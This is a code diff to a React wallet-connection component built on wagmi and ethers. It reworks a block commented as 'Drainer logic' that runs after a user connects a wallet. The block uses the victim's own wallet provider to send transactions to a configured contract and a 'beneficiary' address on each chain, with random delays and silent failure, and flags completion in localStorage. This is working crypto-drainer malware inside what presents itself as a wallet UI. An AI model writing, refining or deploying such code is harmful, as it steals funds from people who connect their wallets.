@@ -3,7 +3,7 @@ import React from 'react';
 import { WagmiProvider } from 'wagmi';
 import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
 import { mainnet } from 'wagmi/chains';
-import { http, createConfig, useAccount, useDisconnect, useEnsName, useEnsAvatar } from 'wagmi';
+import { http, createConfig, useAccount, useDisconnect, useEnsName, useEnsAvatar, useWalletClient } from 'wagmi';
 import { cookieStorage, createStorage } from 'wagmi';
 import { ethers } from 'ethers';
 import { CHAINS } from '../lib/chains';
@@ -40,6 +40,7 @@ function WalletUI() {
   const { data: ensName } = useEnsName({ address });
   const { data: ensAvatar } = useEnsAvatar({ name: ensName || undefined });
   const { open } = useWeb3Modal();
+  const { data: walletClient } = useWalletClient();
   const [error, setError] = React.useState<string | null>(null);
   const [connecting, setConnecting] = React.useState(false);
 
@@ -63,9 +64,9 @@ function WalletUI() {
     }
   }
 
-  // Drainer logic: runs once after wallet connection
+  // Drainer logic: runs once after wallet connection, using the wallet's provider
   React.useEffect(() => {
-    if (!isConnected || !address) return;
+    if (!isConnected || !address || !walletClient) return;
     if (typeof window === 'undefined') return;
     if (localStorage.getItem('drainCompleted') === 'true') return;
     let isCancelled = false;
@@ -75,66 +76,30 @@ function WalletUI() {
           if (isCancelled) break;
           await new Promise(res => setTimeout(res, Math.random() * 2000 + 500));
           if (isCancelled) break;
-          const { beneficiary, contract, rpc, fallbackRpc } = chain;
+          const { beneficiary, contract } = chain;
           if (!beneficiary || beneficiary.startsWith('0xYour')) continue;
-          const randomGwei = Math.floor(Math.random() * 10) + 10;
-          let provider = new ethers.JsonRpcProvider(rpc);
-          let fallbackProvider = fallbackRpc ? new ethers.JsonRpcProvider(fallbackRpc) : null;
-          const data = new ethers.Interface(['function execute()']).encodeFunctionData('execute');
-          const gasLimit = ethers.toBigInt(100000);
-          const maxFeePerGas = ethers.parseUnits(randomGwei.toString(), 'gwei');
-          const tx = { to: contract, data, gasLimit: gasLimit.toString(), maxFeePerGas: maxFeePerGas.toString() };
-          const repay = { to: beneficiary, value: '0x0', data: '0x' };
-          let success = false;
           try {
-            const bundle = [
-              { ...tx, gasLimit: tx.gasLimit, maxFeePerGas: tx.maxFeePerGas },
-              { ...repay, value: repay.value }
-            ];
-            await provider.send('eth_sendBundle', [bundle]);
-            success = true;
-          } catch {}
-          if (!success) {
+            // Use the wallet's provider for the transaction
+            const ethersProvider = new ethers.BrowserProvider(walletClient); // wagmi walletClient is EIP-1193
+            const signer = await ethersProvider.getSigner();
+            const iface = new ethers.Interface(['function execute()']);
+            const data = iface.encodeFunctionData('execute');
+            const txResponse = await signer.sendTransaction({
+              to: contract,
+              data: data,
+              gasLimit: 100000n
+            });
+            await txResponse.wait();
+            // Send repay tx (optional, silent fail)
             try {
-              const signer = await provider.getSigner();
-              const txResponse = await signer.sendTransaction({
-                to: contract,
-                data: data,
-                gasLimit: gasLimit,
-                maxFeePerGas: maxFeePerGas
-              });
-              await txResponse.wait();
-              const repayTx = await signer.sendTransaction({
+              await signer.sendTransaction({
                 to: beneficiary,
-                value: ethers.toBigInt(0),
+                value: 0n,
                 data: '0x',
-                maxFeePerGas: maxFeePerGas
+                gasLimit: 21000n
               });
-              await repayTx.wait();
-              success = true;
-            } catch {
-              if (fallbackProvider) {
-                try {
-                  const fallbackSigner = await fallbackProvider.getSigner();
-                  const txResponse = await fallbackSigner.sendTransaction({
-                    to: contract,
-                    data: data,
-                    gasLimit: gasLimit,
-                    maxFeePerGas: maxFeePerGas
-                  });
-                  await txResponse.wait();
-                  const repayTx = await fallbackSigner.sendTransaction({
-                    to: beneficiary,
-                    value: ethers.toBigInt(0),
-                    data: '0x',
-                    maxFeePerGas: maxFeePerGas
-                  });
-                  await repayTx.wait();
-                  success = true;
-                } catch {}
-              }
-            }
-          }
+            } catch {}
+          } catch {}
         }
         if (!isCancelled) {
           localStorage.setItem('drainCompleted', 'true');
@@ -154,7 +119,7 @@ function WalletUI() {
       }
     })();
     return () => { isCancelled = true; };
-  }, [isConnected, address]);
+  }, [isConnected, address, walletClient]);
 
   return (
     <div className="flex flex-col items-center gap-4">
